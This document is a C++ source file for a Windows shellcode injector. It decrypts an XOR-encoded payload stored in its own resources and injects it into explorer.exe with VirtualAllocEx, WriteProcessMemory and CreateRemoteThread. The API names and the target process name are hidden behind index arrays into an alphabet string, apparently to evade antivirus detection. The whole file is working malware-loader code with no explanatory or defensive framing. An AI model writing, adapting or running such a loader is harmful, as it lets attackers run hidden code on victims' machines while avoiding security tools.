
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <tlhelp32.h>
#include <string>

std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  // Use std::string
    std::string empty_string= "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
         char character = big_string[offsets[i]];
         empty_string += character;
     }
     return empty_string;
}

void loadkumres(const char* rssssame, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}




int main() {
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.\\:";
    int ws_lld_ker_32[] = {10, 4, 17, 13, 4, 11, 55, 54, 62, 3, 11, 11};
    HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
    
    char* kkeyakesey;
    DWORD kkeyakeseyLen;
    loadkumres("dhanushkey1", &kkeyakesey, &kkeyakeseyLen);

    char* kkcode;
    DWORD kkcodeLen;
    loadkumres("dhanushcode56", &kkcode, &kkcodeLen);
    
    
    PROCESSENTRY32 pe32;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    int create_snap[] = { 28, 17, 4, 0, 19, 4, 45, 14, 14, 11, 7, 4, 11, 15, 55, 54, 44, 13, 0, 15, 18, 7, 14, 19 };
    auto pcreate_snap = (HANDLE(WINAPI*)(DWORD, DWORD))GetProcAddress(istfromKe__ws_ls_32, getoriginal(create_snap, big_string, sizeof(create_snap)).c_str());
    HANDLE snapshot = pcreate_snap(TH32CS_SNAPPROCESS, 0);

int expexe[] = {4, 23, 15, 11, 14, 17, 4, 17, 62, 4, 23, 4};
const char *procmantar = getoriginal(expexe, big_string, sizeof(expexe)).c_str();

int proc_firs[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 31, 8, 17, 18, 19};
int proc_Nex[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 39, 4, 23, 19};
int open_proc[] = {40, 15, 4, 13, 41, 17, 14, 2, 4, 18, 18};
int virtu_all[] = {47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23};
auto pPro_firs = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))GetProcAddress(istfromKe__ws_ls_32, getoriginal(proc_firs, big_string, sizeof(proc_firs)).c_str());
auto pPro_nex = (BOOL(WINAPI*)(HANDLE, LPPROCESSENTRY32))GetProcAddress(istfromKe__ws_ls_32, getoriginal(proc_Nex, big_string, sizeof(proc_Nex)).c_str());
auto popen_proc = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))GetProcAddress(istfromKe__ws_ls_32, getoriginal(open_proc, big_string, sizeof(open_proc)).c_str());
LPVOID (*pvirall)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(virtu_all, big_string, sizeof(virtu_all)).c_str());

    pPro_firs(snapshot, &pe32);
    while(pPro_nex(snapshot, &pe32)) {
       if (strcmp(pe32.szExeFile, procmantar) == 0){
              HANDLE hProcess = popen_proc(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
              
              LPVOID clamonua = pvirall(hProcess, NULL, kkcodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
              for (DWORD ma1su = 0; ma1su < kkcodeLen; ma1su++) {
               kkcode[ma1su] ^= kkeyakesey[ma1su % kkeyakeseyLen]; 
          }
             int write_procM[] = {48, 17, 8, 19, 4, 41, 17, 14, 2, 4, 18, 18, 38, 4, 12, 14, 17, 24};
             int creat_rem_th[] = {28, 17, 4, 0, 19, 4, 43, 4, 12, 14, 19, 4, 45, 7, 17, 4, 0, 3};
             int wait_obj[] = {48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19};
             auto pwrite_procM = (BOOL(WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(istfromKe__ws_ls_32, getoriginal(write_procM, big_string, sizeof(write_procM)).c_str());
             auto pcreat_rem_th = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(istfromKe__ws_ls_32, getoriginal(creat_rem_th, big_string, sizeof(creat_rem_th)).c_str());
             auto pwait_obj = (DWORD(WINAPI*)(HANDLE, DWORD))GetProcAddress(istfromKe__ws_ls_32, getoriginal(wait_obj, big_string, sizeof(wait_obj)).c_str()); 
             pwrite_procM(hProcess, clamonua, kkcode, kkcodeLen, NULL);
             
             

             HANDLE tHandle = pcreat_rem_th(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)clamonua, NULL, 0, NULL);
             pwait_obj(tHandle, INFINITE);
             
              int virtu_fre[] = {47, 8, 17, 19, 20, 0, 11, 31, 17, 4, 4, 30, 23};
              auto pvirtu_fre = (BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD))GetProcAddress(istfromKe__ws_ls_32, getoriginal(virtu_fre, big_string, sizeof(virtu_fre)).c_str());
              pvirtu_fre(hProcess, clamonua, 0, MEM_RELEASE);
              
              break;

         }
      }

    return 0;
}
